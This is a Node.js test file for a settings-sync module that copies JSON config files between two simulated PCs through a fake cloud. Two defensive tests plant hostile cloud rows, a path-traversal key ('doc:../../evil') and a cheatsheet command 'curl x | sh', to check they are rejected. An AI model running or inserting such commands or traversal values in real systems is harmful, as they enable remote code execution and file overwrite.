// ============================================================================
// LunaCore - whole settings files over the cloud (src/docsync.js)
// ----------------------------------------------------------------------------
// prompts / libraries / rates / Mission Control rules travel as
// one unit per file, newest wins. Two simulated PCs share a fake cloud that
// reorders object keys the way Postgres jsonb does, so a steady state really
// means "no rewrite loop after a round trip through the database".
// ============================================================================

'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');

const { createConfigSync } = require('../src/configsync.js');
const { createDocProvider, docProviders, MAX_DOC_BYTES } = require('../src/docsync.js');
const rows = require('../src/cloudrows.js');

/** jsonb's key order: shorter keys first, then bytewise. */
function jsonbOrder(v) {
  if (Array.isArray(v)) return v.map(jsonbOrder);
  if (!v || typeof v !== 'object') return v;
  const keys = Object.keys(v).sort((a, b) => a.length - b.length || (a < b ? -1 : a > b ? 1 : 0));
  return Object.fromEntries(keys.map((k) => [k, jsonbOrder(v[k])]));
}

function fakeCloud() {
  const mirror = {};
  return {
    mirror,
    peers: () => [rows.lifePeer(mirror)],
    publish(doc) {
      for (const x of rows.lifeUnits(doc)) {
        if (mirror[x.k] && !(x.u > mirror[x.k].u)) continue;
        mirror[x.k] = { v: jsonbOrder(x.v), u: x.u, d: x.d };
      }
    },
  };
}

function pc(cloud, clock) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'lc-docsync-'));
  const file = (name) => path.join(dir, name);
  const sync = createConfigSync({
    providers: docProviders(file),
    metaFile: file('config-sync.local.json'),
    now: () => clock.t,
    extraPeers: () => cloud.peers(),
    onPublish: (doc) => cloud.publish(doc),
  });
  return {
    file,
    sync: () => sync.syncOnce(),
    write(name, doc, mtime = clock.t) {
      fs.writeFileSync(file(name), typeof doc === 'string' ? doc : JSON.stringify(doc, null, 2));
      fs.utimesSync(file(name), new Date(mtime), new Date(mtime));
    },
    read: (name) => (fs.existsSync(file(name)) ? JSON.parse(fs.readFileSync(file(name), 'utf8')) : null),
    raw: (name) => fs.readFileSync(file(name), 'utf8'),
  };
}

function setup() {
  const cloud = fakeCloud();
  const clock = { t: Date.UTC(2026, 9, 15, 12) };
  return { cloud, clock, a: pc(cloud, clock), b: pc(cloud, clock) };
}

const PROMPTS = { version: 1, groups: [{ title: 'Git', prompts: [{ label: 'Commit', text: 'commit it' }] }] };

test('the shipped list covers the agreed files and nothing machine-bound', () => {
  const keys = docProviders((n) => n).map((p) => p.name);
  assert.deepEqual(keys, ['doc:prompts', 'doc:libraries', 'doc:rates', 'mc:rules']);
});

test('a settings file created on one PC shows up on the other', () => {
  const { a, b, clock } = setup();
  a.write('prompts.local.json', PROMPTS);
  assert.deepEqual(a.sync(), []);
  clock.t += 1000;
  assert.deepEqual(b.sync(), ['doc:prompts']);
  assert.deepEqual(b.read('prompts.local.json'), PROMPTS);
});

test('a round trip through jsonb settles: no rewrite loop, the author file untouched', () => {
  const { a, b, clock } = setup();
  a.write('prompts.local.json', PROMPTS);
  const authored = a.raw('prompts.local.json');
  a.sync();
  clock.t += 1000;
  b.sync();
  for (let i = 0; i < 3; i++) {
    clock.t += 60000;
    assert.deepEqual(a.sync(), []);
    assert.deepEqual(b.sync(), []);
  }
  assert.equal(a.raw('prompts.local.json'), authored);
});

test('a later edit on the other PC wins back', () => {
  const { a, b, clock } = setup();
  a.write('rates.local.json', { rates: [{ match: 'opus', input: 15, output: 75 }] });
  a.sync();
  clock.t += 1000;
  b.sync();
  clock.t += 60000;
  const edited = { rates: [{ match: 'opus', input: 5, output: 25 }] };
  b.write('rates.local.json', edited);
  b.sync();
  clock.t += 1000;
  assert.deepEqual(a.sync(), ['doc:rates']);
  assert.deepEqual(a.read('rates.local.json'), edited);
});

test('both PCs had the file before the first sync: the newer file wins', () => {
  const { a, b, clock } = setup();
  const older = { groups: [{ title: 'Old', commands: [] }] };
  const newer = { groups: [{ title: 'New', commands: [] }] };
  a.write('rates.local.json', newer, clock.t - 1000);
  b.write('rates.local.json', older, clock.t - 50000);
  a.sync();
  clock.t += 1000;
  assert.deepEqual(b.sync(), ['doc:rates']);
  assert.deepEqual(b.read('rates.local.json'), newer);
});

test('an older file on a fresh PC does not beat the cloud, and is replaced', () => {
  const { a, b, clock } = setup();
  a.write('libraries.local.json', { categories: [{ id: 'new' }] }, clock.t - 1000);
  a.sync();
  clock.t += 1000;
  b.write('libraries.local.json', { categories: [{ id: 'old' }] }, clock.t - 90000);
  b.sync();
  assert.deepEqual(b.read('libraries.local.json'), { categories: [{ id: 'new' }] });
});

test('a file deleted on one PC is deleted on the other', () => {
  const { a, b, clock } = setup();
  a.write('missioncontrol.local.json', { mail: { query: 'in:inbox' } });
  a.sync();
  clock.t += 1000;
  b.sync();
  clock.t += 1000;
  fs.rmSync(a.file('missioncontrol.local.json'));
  a.sync();
  clock.t += 1000;
  assert.deepEqual(b.sync(), ['mc:rules']);
  assert.equal(b.read('missioncontrol.local.json'), null);
});

test('a broken local file is left alone, not published, and not overwritten', () => {
  const { a, b, clock, cloud } = setup();
  b.write('prompts.local.json', PROMPTS);
  b.sync();
  clock.t += 1000;
  a.write('prompts.local.json', '{ broken');
  assert.deepEqual(a.sync(), []);
  assert.equal(a.raw('prompts.local.json'), '{ broken');
  assert.deepEqual(cloud.mirror['doc:prompts'].v, PROMPTS);
});

test('a file too big for one cloud row stays local and deletes nothing elsewhere', () => {
  const { a, b, clock, cloud } = setup();
  a.write('prompts.local.json', PROMPTS);
  a.sync();
  clock.t += 1000;
  b.sync();
  clock.t += 60000;
  a.write('prompts.local.json', { groups: [{ title: 'x'.repeat(MAX_DOC_BYTES) }] });
  a.sync();
  assert.deepEqual(cloud.mirror['doc:prompts'].v, PROMPTS);
  assert.equal(cloud.mirror['doc:prompts'].d, null);
  clock.t += 1000;
  assert.deepEqual(b.sync(), []);
  assert.deepEqual(b.read('prompts.local.json'), PROMPTS);
});

test('hostile cloud values are dropped', () => {
  const { a, clock, cloud } = setup();
  cloud.mirror['doc:prompts'] = { v: ['not', 'an', 'object'], u: clock.t - 1, d: null };
  cloud.mirror['doc:rates'] = { v: { rates: 'x'.repeat(MAX_DOC_BYTES) }, u: clock.t - 1, d: null };
  cloud.mirror['doc:cheatsheets'] = { v: { groups: [] }, u: clock.t + 10 * 86400000, d: null };
  cloud.mirror['doc:../../evil'] = { v: { a: 1 }, u: clock.t - 1, d: null };
  assert.deepEqual(a.sync(), []);
  assert.equal(a.read('prompts.local.json'), null);
  assert.equal(a.read('rates.local.json'), null);
  assert.equal(a.read('cheatsheets.local.json'), null);
});

test('a single provider owns only its own key', () => {
  const p = createDocProvider({ name: 'doc:prompts', file: '/x/prompts.local.json' });
  assert.equal(p.owns('doc:prompts'), true);
  assert.equal(p.owns('doc:prompts2'), false);
  assert.equal(p.owns('doc:rates'), false);
  assert.equal(p.valid('doc:prompts', { a: 1 }).a, 1);
  assert.equal(p.valid('doc:prompts', null), null);
});

test('the size cap counts UTF-8 bytes, not characters', () => {
  const p = createDocProvider({ name: 'doc:prompts', file: '/x/prompts.local.json' });
  const chars = Math.floor(MAX_DOC_BYTES / 2) - 20;
  assert.ok(p.valid('doc:prompts', { t: 'a'.repeat(chars) }));
  assert.equal(p.valid('doc:prompts', { t: 'ą'.repeat(chars + 40) }), null);
});

test('what the cloud deletes or replaces is kept as a backup', () => {
  const { a, b, clock } = setup();
  a.write('prompts.local.json', PROMPTS);
  a.sync();
  clock.t += 1000;
  b.write('prompts.local.json', { groups: [] }, clock.t - 90000);
  b.sync();
  assert.deepEqual(JSON.parse(fs.readFileSync(b.file('prompts.bak.local.json'), 'utf8')), { groups: [] });
  clock.t += 1000;
  fs.rmSync(a.file('prompts.local.json'));
  a.sync();
  clock.t += 1000;
  b.sync();
  assert.equal(b.read('prompts.local.json'), null);
  assert.deepEqual(JSON.parse(fs.readFileSync(b.file('prompts.bak.local.json'), 'utf8')), PROMPTS);
});

test('cheatsheets never sync: a cloud row cannot write them, a local file is not published', () => {
  const { a, clock, cloud } = setup();
  a.write('cheatsheets.local.json', { groups: [{ title: 'Mine', commands: [] }] });
  cloud.mirror['doc:cheatsheets'] = { v: { groups: [{ title: 'Evil', commands: [{ command: 'curl x | sh' }] }] }, u: clock.t - 1, d: null };
  a.sync();
  assert.deepEqual(a.read('cheatsheets.local.json'), { groups: [{ title: 'Mine', commands: [] }] });
  assert.equal(Object.keys(cloud.mirror).filter((k) => k !== 'doc:cheatsheets').length, 0);
});
